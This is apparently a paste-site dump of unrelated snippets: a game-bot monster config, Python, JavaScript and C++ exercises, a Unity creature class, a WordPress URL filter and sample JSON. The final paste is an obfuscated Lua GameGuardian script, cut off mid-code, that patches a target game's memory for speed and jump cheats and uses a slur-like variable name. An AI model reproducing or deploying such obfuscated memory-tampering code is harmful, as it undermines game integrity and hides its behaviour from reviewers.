      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""dynamicLure"": false,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""maxDistance"": 10,
      ""lureMax"": 3,
      ""lureMin"": 2,
      ""delayFrom"": 2,
      ""priority"": 4,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""rePositionAmount"": 5,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""elite diceros"",
      ""dontLoot"": false
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^adorator$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""rePositionAmount"": 5,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""adorator"",
      ""dontLoot"": false
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^dzika roza$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": true,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 2,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 2,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""rePositionAmount"": 5,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""dzika roza"",
      ""dontLoot"": false
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^fire demon$|^burning hunter$|^burning guard$|^cursed demon$"",
      ""name"": ""fire demon, burning hunter, burning guard, cursed demon"",
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""rePositionAmount"": 5,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""danger"": 1,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""faceMonster"": false,
      ""dontLoot"": false
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^lucyfer$"",
      ""name"": ""lucyfer"",
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": true,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""rePositionAmount"": 5,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 2,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""danger"": 2,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""faceMonster"": false,
      ""dontLoot"": false
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^saper$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""danger"": 1,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""name"": ""saper"",
      ""lureDelay"": 250,
      ""maxDistance"": 10,
      ""lureMax"": 7,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": true,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLure"": true,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""priority"": 1,
      ""rePositionAmount"": 5
    },
    {
      ""maxDistance"": 10,
      ""keepDistanceRange"": 1,
      ""regex"": ""^arkanoid$"",
      ""name"": ""arkanoid"",
      ""keepDistance"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""diamondArrows"": false,
      ""anchorRange"": 3,
      ""rePosition"": false,
      ""rpSafe"": false,
      ""dynamicLureDelay"": true,
      ""dynamicLure"": true,
      ""faceMonster"": false,
      ""lureMax"": 9,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""closeLureAmount"": 3,
      ""dontLoot"": false,
      ""danger"": 1,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""lureDelay"": 158,
      ""rePositionAmount"": 5
    }
  ]
}"
yukY96As,Untitled,MNNM2021,Python,Wednesday 7th of February 2024 01:22:09 PM CDT,"row, col = [int(x) for x in input().split()]

matrix = []

directions = {
    ""up"": [-1, 0],
    ""down"": [1, 0],
    ""left"": [0, -1],
    ""right"": [0, 1],
}

b_positions = None

for r in range(row):
    row_input = list(input())
    matrix.append(row_input)
    if ""B"" in row_input:
        c = row_input.index(""B"")
        b_positions = (r, c)

start_row, start_col = b_positions[0], b_positions[1]
while True:
    command = input()

    if not command:
        break

    current_row = b_positions[0]
    current_col = b_positions[1]

    desired_row = current_row + directions[command][0]
    desired_col = current_col + directions[command][1]

    if not 0 <= desired_row < row or not 0 <= desired_col < col:
        matrix[start_row][start_col] = "" ""
        print(""The delivery is late. Order is canceled."")
        break

    if matrix[desired_row][desired_col] == ""A"":
        b_positions = (desired_row, desired_col)
        matrix[desired_row][desired_col] = ""P""
        print(""Pizza is delivered on time! Next order..."")
        matrix[start_row][start_col] = ""B""
        break

    if matrix[desired_row][desired_col] == ""*"":
        continue

    if matrix[desired_row][desired_col] == ""P"":
        matrix[desired_row][desired_col] = ""R""
        b_positions = (desired_row, desired_col)
        print(""Pizza is collected. 10 minutes for delivery."")

    else:
        b_positions = (desired_row, desired_col)
        matrix[desired_row][desired_col] = "".""


for ro in matrix:
    print("""".join(ro))
"
c3rrAfcw,02. Delivery Boy,MNNM2021,Python,Wednesday 7th of February 2024 01:10:34 PM CDT,"row, col = [int(x) for x in input().split()]

matrix = []

directions = {
    ""up"": [-1, 0],
    ""down"": [1, 0],
    ""left"": [0, -1],
    ""right"": [0, 1],
}

b_positions = None

for r in range(row):
    row_input = list(input())
    matrix.append(row_input)
    if ""B"" in row_input:
        c = row_input.index(""B"")
        b_positions = (r, c)

ROW, COL = b_positions[0], b_positions[1]
while True:
    command = input()

    if not command:
        break

    current_row = b_positions[0]
    current_col = b_positions[1]

    desired_row = current_row + directions[command][0]
    desired_col = current_col + directions[command][1]

    if not 0 <= desired_row < row or not 0 <= desired_col < col:
        matrix[ROW][COL] = "" ""
        print(""The delivery is late. Order is canceled."")
        break

    if matrix[desired_row][desired_col] == ""A"":
        b_positions = (desired_row, desired_col)
        matrix[desired_row][desired_col] = ""P""
        print(""Pizza is delivered on time! Next order..."")
        break

    if matrix[desired_row][desired_col] == ""*"":
        continue

    if matrix[desired_row][desired_col] == ""P"":
        matrix[desired_row][desired_col] = ""R""
        b_positions = (desired_row, desired_col)
        print(""Pizza is collected. 10 minutes for delivery."")

    else:
        b_positions = (desired_row, desired_col)
        matrix[desired_row][desired_col] = "".""


for ro in matrix:
    print("""".join(ro))
"
HEvni0wv,19 две кучи,nq1s788,Python,Wednesday 7th of February 2024 01:04:07 PM CDT,"from functools import lru_cache


def moves(h):
    x = h[0]
    y = h[1]
    return (x, y * 2), (x * 2, y), (x, y + 1), (x + 1, y)


@lru_cache(None)
def game(h):
    if sum(h) >= 100:
        return 'WIN'
    elif any(game(m) == 'WIN' for m in moves(h)):
        return 'P1'
    elif all(game(m) in ['P1'] for m in moves(h)):
        return 'V1'
    elif any(game(m) == 'V1' for m in moves(h)):
        return 'P2'
    elif all(game(m) in ['P1', 'P2'] for m in moves(h)):
        return 'V2'


def p19(h):
    return any(game(m) == 'P1' for m in moves(h))


print([s for s in range(1, 100) if p19((s, 20))]) #ваня выиграл первым ходом
print([s for s in range(1, 100) if game((s, 20)) == 'P2']) #петя вторым ходом
print([s for s in range(1, 100) if game((s, 20)) == 'V2'])
"
gPMArFqa,class Company,Pijomir,JavaScript,Wednesday 7th of February 2024 12:54:03 PM CDT,"class Company{
    constructor() {
        this.departments = {};
    }

    addEmployee(name, salary, position, department) {
        salary = Number(salary);
        if (!name || !salary || !position || !department || salary < 0) {
            throw new Error('Invalid input!');
        }

        if (!this.departments[department]) {
            this.departments[department] = {totalSalariesSum: 0, employees: []};
        }

        this.departments[department].employees.push({name, salary, position});
        this.departments[department].totalSalariesSum += salary;
        return `New employee is hired. Name: ${name}. Position: ${position}`;
    }

    bestDepartment() {
        for (let  deptInfo of Object.values(this.departments)) {
            deptInfo.totalSalariesSum = deptInfo.totalSalariesSum / deptInfo.employees.length;
        }

        let bestDepartment = Object.entries(this.departments).sort((a, b) => b[1].totalSalariesSum - a[1].totalSalariesSum).shift();
        let departmentPart = `Best Department is: ${bestDepartment[0]}\n`;
        let averageSalaryPart = `Average salary: ${(bestDepartment[1].totalSalariesSum).toFixed(2)}\n`;
        let employeesPart = bestDepartment[1].employees.sort((a, b) => b.salary - a.salary || a.name.localeCompare(b.name)).map(a => `${a.name} ${a.salary} ${a.position}`).join('\n');
        return departmentPart + averageSalaryPart + employeesPart;
    }
}"
SVhbcvrd,Arrays_P9,nathaditya,C++,Wednesday 7th of February 2024 12:49:52 PM CDT,"#include<bits/stdc++.h>
using namespace std;

long solve(vector<long> nums){
    long prev = nums[0];
    long ops = 0;
    for(int i = 1; i < nums.size(); i++){
        if(nums[i] < prev){
            ops += prev - nums[i];
            nums[i] = prev;
        }
        prev = nums[i];
    }
    return ops;
}

int main(){
    long n;
    cin >> n;
    vector<long> arr(n);
    for(int i = 0; i < n; i++)
        cin >> arr[i];
        
    cout << solve(arr);
}"
2mfivgTU,CreatureBase,GoodNoodle,C#,Wednesday 7th of February 2024 12:48:35 PM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public enum Habitates
{
    Fire,
    Water,
    Earth,
    Ice,
    Darkness,
    Etharial
}

[CreateAssetMenu(fileName = ""Creature"", menuName = ""Creature/Create New"")]
public class CreatureBase : ScriptableObject
{
    [SerializeField] string name;

    public int ID;

    [TextArea]
    [SerializeField] string description;

    [SerializeField] Sprite leftSprite;
    [SerializeField] Sprite rightSprite;

    [SerializeField] CreatureType type1;
    [SerializeField] CreatureType type2;

    [SerializeField] Habitates creatureHabitates;

    //base stats

    [SerializeField] int attack;
    [SerializeField] int defense;
    [SerializeField] int maxhp;
   // [SerializeField] int spAttack;
   // [SerializeField] int spDefense;
    [SerializeField] int speed;
    [SerializeField] int maxMp;
    [SerializeField] int currentmp;

    [SerializeField] int expGain;
    [SerializeField] GrowthRate growthRate;

    [SerializeField] int catchRate = 255;

    public const int maxMoves = 10;

    [SerializeField] List<LearnableMoves> learnableMoves;
    [SerializeField] List<MoveBase> learnableByItems;

    [SerializeField] List<Evolution> evolutions;

    [SerializeField] public CreatureBase instance;
    private void Awake()
    {
        instance= this; 
    }
    public int GetExpForLevel(int level)
    {
        if(growthRate == GrowthRate.Fast)
        {
            return 4 * (level * level * level) / 5;
        }
        else if (growthRate == GrowthRate.MediumFast)
        {
            return level * level * level;
        }

        return -1;
    }
    public string Name
    {
        get { return name; }
    }

    public string Description { 
        
        get { return description; } 
    }
    public Sprite Leftsprite
    {
        get { return leftSprite; }
    }

    public Sprite RightSprite
    {
        get { return rightSprite; }
    }
    public CreatureType Type1
    {
        get { return type1; }
    }
    public CreatureType Type2
    {
        get { return type2; }
    }

    public int Attack
    {
        get { return attack; }
    }

    public int Defense
    {
        get { return defense; }
    }

    public int MaxHP
    {
        get { return maxhp; }
    }
    public int MaxMP
    {
        get { return maxMp; }
    }

    public int CurrentMP
    {
        get { return currentmp; }
    }

    public List<LearnableMoves> LearnableMoves
    {
        get { return learnableMoves; }
    }

    public List<MoveBase> LearnableByItems => learnableByItems;

    public List<Evolution> Evolutions => evolutions;

   // public int SpAttack
   // {
    //    get { return spAttack; }
  //  }

 //   public int SpDefense
  //  {
   //     get { return spDefense; }
   // }

    public int Speed
    {
        get { return speed; }
    }

    public int CatchRate => catchRate;

    public int ExpGain => expGain;

    public GrowthRate GrowthRate => growthRate;

    public Habitates getHabitate { get { return creatureHabitates; } }

}

[System.Serializable] 
public class LearnableMoves
{
    [SerializeField] MoveBase moveBase;
    [SerializeField] int level;

    public MoveBase Base {
        get { return moveBase; }

        }

    public int Level
    {
        get { return level; }
    }
}

[System.Serializable]
public class Evolution
{
    [SerializeField] CreatureBase evolveInto;
    [SerializeField] int requiredLevel;
    [SerializeField] ItemBase requiredItem;

    public CreatureBase EvolveInto => evolveInto;
    public int RequiredLevel => requiredLevel;

    public ItemBase RequiredItem => requiredItem;
}
public enum CreatureType
{
    normal,
    fire,
    water,
    darkness,
    ice,
    earth,
    ethareal
}

public enum GrowthRate
{
    Fast,
    MediumFast,
}
public enum Stat
{
    Attack,
    Defense,
    SpDefense,
    SpAttack,
    Speed,

    // to boost move accuracy
    Accuracy,
    Evasion,
    
}



public class TypeChart
{
   static float[][] chart =
    {
        //                    NOR  FIR  WAT
       /* NOR*/ new float [] {1f,   1f, 1f},
       /* FIR*/ new float [] {1f,  .5f,.5f},
       /* WAT*/ new float [] {1f,   2f,.5f}
    };

    public static float GetEffectivness(CreatureType attackType, CreatureType defenseType)
    {
        if (attackType == CreatureType.normal || defenseType == CreatureType.normal)
            return 1;

        int row = (int)attackType - 1;
        int col = (int)defenseType - 1;

        return chart[row][col];
    }
}"
rjWHSRKH,Tax combination archive,mbis,PHP,Wednesday 7th of February 2024 12:41:57 PM CDT,"function pm_detect_tax_combination( $request ) {
	global $wp, $wpdb;

	$taxonomies = array(
		'fuel',
	);

	$taxonomies_2 = array(
		'manufacturer'
	);

	// Parse the URI
	// URL Format: taxonomy_term/taxonomy_2_term
	preg_match( '/^([^\/]+)(?:\/([^\/]+))?(?:\/page\/([\d]+))?/', $wp->request, $parts );

	if ( ! empty( $parts[1] ) && ! empty( $parts[2] ) ) {
		// Get term #1
		$term = $wpdb->get_row( $wpdb->prepare( ""
		    SELECT * FROM {$wpdb->terms} AS t
            LEFT JOIN {$wpdb->term_taxonomy} AS tt ON t.term_id = tt.term_id
            WHERE t.slug = %s"", sanitize_title( $parts[1] ) ) );

		// Get term #2
		$term_2 = $wpdb->get_row( $wpdb->prepare( ""
            SELECT * FROM {$wpdb->terms} AS t
            LEFT JOIN {$wpdb->term_taxonomy} AS tt ON t.term_id = tt.term_id
            WHERE slug = %s"", sanitize_title( $parts[2] ) ) );

		// Filter the query if both post type & term were found
		if ( ! empty( $term ) && in_array( $term->taxonomy, $taxonomies ) && ! empty( $term_2 ) && in_array( $term_2->taxonomy, $taxonomies_2 ) ) {
			$request = array(
				$term->taxonomy   => $term->slug,
				$term_2->taxonomy => $term_2->slug,
				'do_not_redirect' => 1,
				'new_canonical'   => 1
			);

            // Disable inbuilt canonical redirect
			remove_action( 'template_redirect', 'wp_old_slug_redirect' );
			remove_action( 'template_redirect', 'redirect_canonical' );

			// Support pagination
			if ( ! empty( $parts[3] ) ) {
				$request['paged'] = $parts[3];
			}
		}
	}

	return $request;
}
add_filter( 'request', 'pm_detect_tax_combination', 99 );"
7cdLzFBx,Untitled,yarin0600,JSON,Wednesday 7th of February 2024 12:38:35 PM CDT,"{
  ""1234-ABCD"": {
    ""id"": ""abc123"",
    ""data"": {""value"": ""John""},
    ""propId"": ""firstname"",
    ""parentId"": ""1234"",
    ""createdAt"": 1644298800,
    ""type"": ""String""
  },
  ""5678-EFGH"": {
    ""id"": ""def456"",
    ""data"": {""value"": ""Doe""},
    ""propId"": ""lastname"",
    ""parentId"": ""5678"",
    ""createdAt"": 1644298900,
    ""type"": ""String""
  },
  ""9876-IJKL"": {
    ""id"": ""ghi789"",
    ""data"": {""value"": true},
    ""propId"": ""isVerified"",
    ""parentId"": ""9876"",
    ""createdAt"": 1644299000,
    ""type"": ""Boolean""
  },
  ""1234-MNOP"": {
    ""id"": ""jkl012"",
    ""data"": {""value"": ""profile_pic_url.jpg""},
    ""propId"": ""profilePic"",
    ""parentId"": ""1234"",
    ""createdAt"": 1644299100,
    ""type"": ""FilesArray""
  },
  ""5678-QRST"": {
    ""id"": ""mno345"",
    ""data"": {""value"": 42},
    ""propId"": ""age"",
    ""parentId"": ""5678"",
    ""createdAt"": 1644299200,
    ""type"": ""Number""
  },
  ""9876-UVWX"": {
    ""id"": ""pqr678"",
    ""data"": {""value"": ""document.pdf""},
    ""propId"": ""files"",
    ""parentId"": ""9876"",
    ""createdAt"": 1644299300,
    ""type"": ""FilesArray""
  },
  ""1234-YZAB"": {
    ""id"": ""stu901"",
    ""data"": {""value"": ""user@example.com""},
    ""propId"": ""email"",
    ""parentId"": ""1234"",
    ""createdAt"": 1644299400,
    ""type"": ""String""
  },
  ""5678-CD12"": {
    ""id"": ""vwx234"",
    ""data"": {""value"": 25},
    ""propId"": ""yearsOfExperience"",
    ""parentId"": ""5678"",
    ""createdAt"": 1644299500,
    ""type"": ""Number""
  },
  ""9876-EFGH"": {
    ""id"": ""yza567"",
    ""data"": {""value"": false},
    ""propId"": ""isActive"",
    ""parentId"": ""9876"",
    ""createdAt"": 1644299600,
    ""type"": ""Boolean""
  }
}"
Qw2DE5TN,Arrays_P8,nathaditya,C++,Wednesday 7th of February 2024 12:23:57 PM CDT,"#include<bits/stdc++.h>
using namespace std;

void solve(int n){
    if(n == 1)
        cout << 1;
        
    else if(n < 4)
        cout << ""NO SOLUTION"";
    else{
        vector<int> nums;
        int ctr = 1;
        int fctr = 0;
        
        for(int i = 2; i <= n; i+=2)
            nums.push_back(i);
        for(int i = 1; i <= n; i+=2)
            nums.push_back(i);
        
        for(int i: nums)
            cout << i << "" "";
    }
}

int main(){
    int n;
    cin >> n;
    
    solve(n);
}"
5AGEfGza,SPEED,Kingman111,Lua,Wednesday 7th of February 2024 12:16:04 PM CDT,"local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v13,v14)local v15={};for v33=1, #v13 do v6(v15,v0(v4(v1(v2(v13,v33,v33 + 1 )),v1(v2(v14,1 + (v33% #v14) ,1 + (v33% #v14) + 1 )))%256 ));end return v5(v15);end on=""☑️ON☑️"";off=""❎OFF❎"";NIGA=off;AI=off;local v8,v9,v10=nil,0,0;local function v11(v16)local v17=0;local v18;local v19;while true do if (v17==(0 + 0)) then v18=0;v19=nil;v17=2 -1 ;end if (v17==1) then while true do if (v18==0) then local v44=0 + 0 ;while true do if ((0 + 0)==v44) then if (v8==v16) then return v9,v10;end v19=gg.getRangesList(v16 or v7(""\221\202\217\44\234\233\196\14\193\141\200\42"",""\126\177\163\187\69\134\219\167"") );v44=270 -(239 + 30) ;end if (v44==(1 + 0)) then v18=1;break;end end end if (1==v18) then local v45=0 + 0 ;while true do if (v45==(0 -0)) then for v77,v78 in ipairs(v19) do if (v78.state==v7(""\27\204"",""\156\67\173\74\165"")) then v9=v78.start;v10=v19[ #v19][v7(""\49\185\77"",""\38\84\215\41\118\220\70"")];break;end end return v9,v10;end end end end break;end end end local function v12(v20,v21,v22)local v23=0 -0 ;local v24;local v25;local v26;while true do if (v23==(315 -(306 + 9))) then v11(v20);v24,v25={},0;v23=3 -2 ;end if (v23==(1 + 1)) then if (type(v26)~=v7(""\187\105\110\33\29\115"",""\35\200\29\28\72\115\20\154"")) then return true;else local v41=0 + 0 ;while true do if (v41==0) then gg.alert(v26);return false;end end end break;end if (v23==(1 + 0)) then local v40=0 -0 ;while true do if ((1375 -(1140 + 235))==v40) then for v61 in string.gmatch(v22,v7(""\21\37\103\33"",""\158\48\118\66\114"")) do local v62=0 + 0 ;local v63;while true do if (v62==0) then v63=0 + 0 ;while true do if (v63==0) then table.insert(v24,{[v7(""\170\32\20\36\118\182\232"",""\155\203\68\112\86\19\197"")]=v9 + v21 + v25 ,[v7(""\64\209\55\251\83"",""\152\38\189\86\156\32\24\133"")]=gg.TYPE_BYTE,[v7(""\234\86\171\83\249"",""\38\156\55\199"")]=v61   .. ""r"" });v25=v25 + 1 + 0 ;break;end end break;end end end v26=gg.setValues(v24);v40=53 -(33 + 19) ;end if (v40==1) then v23=1 + 1 ;break;end end end end end gg.setVisible(false);function START()local v27=0;while true do if (v27==0) then T=gg.getTargetPackage();if (T==v7(""\26\176\220\145\143\45\58\29\190\216\209\140\33\55\22\186\223\203\195\35\36\27\173\198\200"",""\84\121\223\177\191\237\76"")) then menu=gg.multiChoice({v7(""\154\67\219\161\122\123\57\205\183"",""\161\219\54\169\192\90\48\80""),v7(""\101\77\14\34\9\112\1\43\78\71"",""\69\41\34\96""),v7(""\144\204\217\13\66\25\189\205\208\15\66\4\154\229"",""\75\220\163\183\106\98""),AI   .. v7(""\79\250\184\39\220\7\190\203\63\216\1\177"",""\185\98\218\235\87"") ,NIGA   .. v7(""\134\124\3\239\205\171\201\48\34\166\244\191\198\44"",""\202\171\92\71\134\190"") ,""⛔ᴇxιт ғʀoм scʀιᴘт⛔""},nil,v7(""\28\210\41\154\39\192\33\141\105\156\108\168\32\213\63\183\56\217"",""\232\73\161\76""));if (menu==nil) then else if menu[1 + 0 ] then FUCKTHISSHIT();end if menu[5 -3 ] then LONG();end if menu[1491 -(1309 + 179) ] then OFF();end if menu[6 -2 ] then SPEED();end if menu[5] then JUMP();end if menu[3 + 3 ] then local v68=0 -0 ;local v69;while true do if (0==v68) then v69=0 + 0 ;while true do if (v69==(0 -0)) then gg.setVisible(true);os.exit();break;end end break;end end end end else local v42=0 -0 ;while true do if (v42==0) then gg.setVisible(true);gg.alert(v7(""\150\216\73\88\94\136\204\80\88\94\130\214\87\29\61\179\214\77\78\27\191\153\109\77\28\169\153\106\84\25\179\220\81\73\94\191\216\86\92\94\139\203\77\94\27\168\202"",""\126\219\185\34\61""));v42=1;end if (v42==1) then local v64=609 -(295 + 314) ;while true do if (v64==(0 -0)) then local v79=1962 -(1300 + 662) ;while true do if ((0 -0)==v79) then os.exit();gg.clearResults();v79=1756 -(1178 + 577) ;end if (v79==(1 + 0)) then v64=2 -1 ;break;end end end if (1==v64) then v42=1407 -(851 + 554) ;break;end end end if (2==v42) then gg.clearList();break;end end end v27=1;end if (v27==(1 + 0)) then AGYT= -(2 -1);break;end end end function FUCKTHISSHIT()local v28=0 -0 ;local v29;while true do if (v28==(302 -(115 + 187))) then v29=0;while true do if (v29==(7 + 1)) then v12(v7(""\251\250\62\219\251\161\63\194\231\189\47\221"",""\178\151\147\92""),13051772,v7(""\175\173\12\98\65\12\47\170\189\104\100"",""\26\236\157\44\82\114\44""));gg.setVisible(false);v12(v7(""\38\39\215\82\38\124\214\75\58\96\198\84"",""\59\74\78\181""),12356036 + 695864 ,v7(""\6\129\26\10\224\101\132\124\26\151\115"",""\211\69\177\58\58""));gg.setVisible(false);v12(v7(""\187\236\123\252\229\153\180\245\105\187\250\196"",""\171\215\133\25\149\137""),51436055 -38383527 ,v7(""\194\152\114\170\188\112\169\100\161\236\100"",""\34\129\168\82\154\143\80\156""));gg.setVisible(false);v12(v7(""\137\187\49\2\68\28\138\149\162\125\24\71"",""\233\229\210\83\107\40\46""),13054189 -(160 + 1001) ,v7(""\226\18\114\134\86\129\23\20\150\33\151"",""\101\161\34\82\182""));gg.setVisible(false);v12(v7(""\228\4\91\247\215\176\129\62\248\67\74\241"",""\78\136\109\57\158\187\130\226""),13052116,v7(""\29\111\185\161\109\127\172\215\126\27\175"",""\145\94\95\153""));v29=9;end if (v29==(18 + 2)) then gg.clearResults();gg.clearList();v12(v7(""\67\92\118\1\67\7\119\24\95\27\103\7"",""\104\47\53\20""),12853528 + 5775332 ,v7(""\128\28\193\76\239\79\246\106\193\56\234"",""\111\195\44\225\124\220""));gg.setVisible(false);v12(v7(""\212\79\2\122\167\249\219\86\16\61\184\164"",""\203\184\38\96\19\203""),38124625 -19501193 ,v7(""\26\35\57\17\157\121\38\95\1\234\111"",""\174\89\19\25\33""));gg.setVisible(false);gg.clearResults();gg.clearList();v12(v7(""\35\27\80\71\251\213\8\63\2\28\93\248"",""\107\79\114\50\46\151\231""),18882380,v7(""\26\246\245\121\217\121\226\230\121\130\227"",""\160\89\198\213\73\234\89\215""));v29=21;end if ((364 -(237 + 121))==v29) then local v46=897 -(525 + 372) ;while true do if (0==v46) then v12(v7(""\87\39\182\95\65\9\45\164\70\3\72\33"",""\45\59\78\212\54""),13051780,v7(""\51\6\195\219\213\110\248\214\80\114\213"",""\144\112\54\227\235\230\78\205""));gg.setVisible(false);v46=1 -0 ;end if (v46==(12 -8)) then v12(v7(""\92\179\195\178\92\232\194\171\64\244\210\180"",""\219\48\218\161""),13066350 -(96 + 46) ,v7(""\199\33\60\25\136\15\181\194\49\88\31"",""\128\132\17\28\41\187\47""));v29=7;break;end if (v46==(779 -(643 + 134))) then v12(v7(""\182\93\180\73\182\6\181\80\170\26\165\79"",""\32\218\52\214""),4713030 + 8342706 ,v7(""\109\71\113\248\162\240\16\124\14\51\103"",""\58\46\119\81\200\145\208\37""));gg.setVisible(false);v46=6 -3 ;end if (v46==(11 -8)) then v12(v7(""\39\133\50\165\165\239\53\59\156\126\191\166"",""\86\75\236\80\204\201\221""),13066160,v7(""\81\17\55\213\173\203\39\103\55\161\168"",""\235\18\33\23\229\158""));gg.setVisible(false);v46=4;end if (v46==1) then v12(v7(""\191\33\13\245\220\9\176\56\31\178\195\84"",""\59\211\72\111\156\176""),18813428,v7(""\109\215\163\125\29\199\182\11\14\163\181"",""\77\46\231\131""));gg.setVisible(false);v46=2 + 0 ;end end end if (v29==(36 -17)) then gg.setVisible(false);v12(v7(""\1\56\55\116\1\44\14\33\37\51\30\113"",""\30\109\81\85\29\109""),42155110 -21532546 ,v7(""\220\33\20\230\101\158\169\217\49\112\224"",""\156\159\17\52\214\86\190""));gg.setVisible(false);gg.clearResults();gg.clearList();v12(v7(""\162\230\191\181\162\189\190\172\190\161\174\179"",""\220\206\143\221""),20864299 -(316 + 403) ,v7(""\165\45\109\71\139\140\135\160\61\9\65"",""\178\230\29\77\119\184\172""));gg.setVisible(false);v12(v7(""\249\183\8\18\123\170\246\174\26\85\100\247"",""\152\149\222\106\123\23""),13868078 + 6995770 ,v7(""\254\118\182\19\230\157\115\208\3\145\139"",""\213\189\70\150\35""));gg.setVisible(false);v29=20;end if (v29==(68 -43)) then local v47=0 + 0 ;while true do if (v47==(7 -4)) then gg.clearResults();gg.setVisible(false);v47=4;end if (v47==(1 + 0)) then gg.clearResults();gg.setVisible(false);v47=2;end if (v47==(0 + 0)) then local v70=0 -0 ;while true do if (v70==(4 -3)) then v47=1 -0 ;break;end if ((0 + 0)==v70) then gg.setVisible(false);gg.setVisible(false);v70=1;end end end if ((7 -3)==v47) then gg.clearList();v29=2 + 24 ;break;end if (v47==(5 -3)) then gg.clearList();gg.clearList();v47=20 -(12 + 5) ;end end end if (v29==10) then local v48=0 -0 ;while true do if (v48==(1 -0)) then local v71=0 -0 ;while true do if ((0 -0)==v71) then v12(v7(""\182\132\170\219\182\223\171\194\170\195\187\221"",""\178\218\237\200""),13059756,v7(""\149\229\166\128\229\245\179\246\246\145\176"",""\176\214\213\134""));gg.setVisible(false);v71=1 + 0 ;end if (v71==(1974 -(1656 + 317))) then v48=2 + 0 ;break;end end end if (4==v48) then v12(v7(""\63\91\80\255\245\97\81\66\230\183\32\93"",""\153\83\50\50\150""),13060960,v7(""\126\38\51\76\32\235\24\123\54\87\74"",""\45\61\22\19\124\19\203""));v29=9 + 2 ;break;end if ((7 -4)==v48) then v12(v7(""\200\194\17\205\81\164\171\212\219\93\215\82"",""\200\164\171\115\164\61\150""),13060460,v7(""\157\164\67\21\208\254\161\37\5\167\232"",""\227\222\148\99\37""));gg.setVisible(false);v48=4;end if (v48==(0 -0)) then local v72=354 -(5 + 349) ;while true do if (v72==1) then v48=4 -3 ;break;end if (v72==(1271 -(266 + 1005))) then v12(v7(""\66\25\53\115\66\66\52\106\94\94\36\117"",""\26\46\112\87""),13057856,v7(""\154\115\235\36\236\255\16\146\249\7\253"",""\212\217\67\203\20\223\223\37""));gg.setVisible(false);v72=1 + 0 ;end end end if (v48==(6 -4)) then v12(v7(""\248\164\180\221\164\4\90\228\189\248\199\167"",""\57\148\205\214\180\200\54""),17194286 -4134222 ,v7(""\49\173\117\100\37\82\168\19\116\82\68"",""\22\114\157\85\84""));gg.setVisible(false);v48=3;end end end if (v29==(1719 -(561 + 1135))) then gg.setVisible(false);v12(v7(""\200\38\35\45\3\150\44\49\52\65\215\32"",""\111\164\79\65\68""),24514941 -5703157 